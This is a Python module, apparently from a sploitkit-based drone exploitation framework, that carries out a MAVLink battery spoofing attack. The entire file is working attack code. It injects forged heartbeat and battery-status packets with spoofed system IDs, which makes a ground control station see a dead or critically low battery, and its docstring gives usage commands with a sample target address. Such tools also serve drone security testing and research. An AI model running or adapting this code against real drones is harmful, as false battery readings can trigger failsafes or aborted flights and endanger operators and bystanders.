from sploitkit import Config, Option
from lib.base import MAVLinkModule
from pymavlink import mavutil
import time
import sys
import os

# Force MAVLink 2.0 (critical for proper message routing)
os.environ['MAVLINK20'] = '1'

class BatterySpoofing(MAVLinkModule):
    """
    Spoof the drone's battery status to mislead the Ground Control Station (GCS)
    into thinking the battery is critically low or dead.

    Connection:
        For spoofing, use 'udpout:' to send TO the target port:
        - Network (recommended): udpout:10.13.0.6:14550
        - Network (bidirectional): udp:10.13.0.6:14550
        - Serial: /dev/ttyUSB0 (Linux) or COM3 (Windows)

    Usage:
        set connection udpout:10.13.0.6:14550
        set battery_remaining 0
        run
    """

    # Inherit connection config from base class and add module-specific options
    config = MAVLinkModule.config + Config({
        Option(
            name='battery_remaining',
            description='Remaining battery percentage (0-100)',
            required=False,
        ): "0",  # Default: 0% - dead battery
        Option(
            name='voltage',
            description='Battery voltage in millivolts (per cell)',
            required=False,
        ): "3000",  # Default: 3.0V (low for LiPo)
        Option(
            name='duration',
            description='Duration of spoofing in seconds (0 for infinite)',
            required=False,
        ): "60",  # Default value
        Option(
            name='update_rate',
            description='Battery status update rate in Hz',
            required=False,
        ): "1",  # Default: 1 Hz
        Option(
            name='src_system_id',
            description='Source system ID to spoof (what system the message appears from)',
            required=False,
        ): "1",  # Default: System 1
        Option(
            name='src_component_id',
            description='Source component ID to spoof (what component the message appears from)',
            required=False,
        ): "1",  # Default: Component 1
        Option(
            name='tgt_system_id',
            description='Target system ID (who to send to, 0 for broadcast)',
            required=False,
        ): "0",  # Default: Broadcast
        Option(
            name='tgt_component_id',
            description='Target component ID (which component to target, 0 for broadcast)',
            required=False,
        ): "0",  # Default: Broadcast
    })

    def send_heartbeat(self, master):
        """
        Send a heartbeat message to announce system presence.
        This is CRITICAL for GCS/MAVProxy to recognize and route messages.
        """
        master.mav.heartbeat_send(
            mavutil.mavlink.MAV_TYPE_QUADROTOR,
            mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            0,  # base_mode
            0,  # custom_mode
            0   # system_status
        )

    def send_battery_status(self, master, battery_remaining, voltage):
        """
        Send a spoofed MAVLink BATTERY_STATUS message.
        """
        # Send HEARTBEAT first (crucial for GCS/MAVProxy to recognize system)
        self.send_heartbeat(master)

        # Calculate voltages for a 3-cell battery (assuming all cells same voltage)
        voltages = [voltage, voltage, voltage, 0, 0, 0, 0, 0, 0, 0]

        master.mav.battery_status_send(
            id=0,  # Battery ID
            battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,
            type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,
            temperature=300,  # 30°C
            voltages=voltages,
            current_battery=-1,  # Not measured
            current_consumed=5000,  # mAh consumed
            energy_consumed=10000,  # Joules consumed
            battery_remaining=battery_remaining
        )

    def run(self):
        # Retrieve configuration options
        battery_remaining = int(self.config['battery_remaining'])
        voltage = int(self.config['voltage'])
        duration = int(self.config['duration'])
        update_rate = int(self.config['update_rate'])
        src_system_id = int(self.config['src_system_id'])
        src_component_id = int(self.config['src_component_id'])
        tgt_system_id = int(self.config['tgt_system_id'])
        tgt_component_id = int(self.config['tgt_component_id'])

        separator = "=" * 80
        self.logger.info(separator)
        self.logger.info("Battery Spoofing Attack")
        self.logger.info(separator)
        self.logger.warning("This will inject false battery status into the MAVLink stream")
        self.logger.info(f"Battery Remaining: {battery_remaining}%")
        self.logger.info(f"Cell Voltage: {voltage}mV ({voltage/1000:.2f}V)")
        self.logger.info(f"Update Rate: {update_rate} Hz")
        self.logger.info(f"Source: System ID {src_system_id}, Component ID {src_component_id}")
        self.logger.info(f"Target: System ID {tgt_system_id}, Component ID {tgt_component_id}")
        if duration > 0:
            self.logger.info(f"Duration: {duration} seconds")
        else:
            self.logger.info("Duration: Infinite (Ctrl+C to stop)")
        self.logger.info(separator)

        if battery_remaining == 0:
            self.logger.warning("WARNING: 0% battery will indicate complete battery failure!")

        master = None
        try:
            # Connect to the MAVLink device (supports both serial and network)
            master = self.connect_drone()

            # Set spoofed source and target IDs
            master.source_system = src_system_id
            master.source_component = src_component_id
            master.target_system = tgt_system_id
            master.target_component = tgt_component_id

            start_time = time.time()
            count = 0
            interval = 1.0 / update_rate

            # Main spoofing loop
            while True:
                # Check if the duration has been reached
                if duration > 0 and (time.time() - start_time >= duration):
                    self.logger.info(f"Spoofing duration of {duration} seconds reached. Stopping...")
                    break

                # Send spoofed battery status
                self.send_battery_status(master, battery_remaining, voltage)

                count += 1

                if count % (update_rate * 10) == 0:
                    elapsed = time.time() - start_time
                    self.logger.info(f"Sent {count} spoofed battery packets ({elapsed:.1f}s elapsed)")

                time.sleep(interval)

            self.logger.success(f"\n{separator}")
            self.logger.success(f"Battery Spoofing Completed")
            self.logger.success(f"Total packets sent: {count}")
            self.logger.success(f"{separator}")

        except KeyboardInterrupt:
            self.logger.info("\n\nAttack interrupted by user")
        except Exception as e:
            self.logger.error(f"Error during spoofing: {str(e)}")
            import traceback
            self.logger.error(traceback.format_exc())
        finally:
            # Clean up connection
            self.close_connection(master)
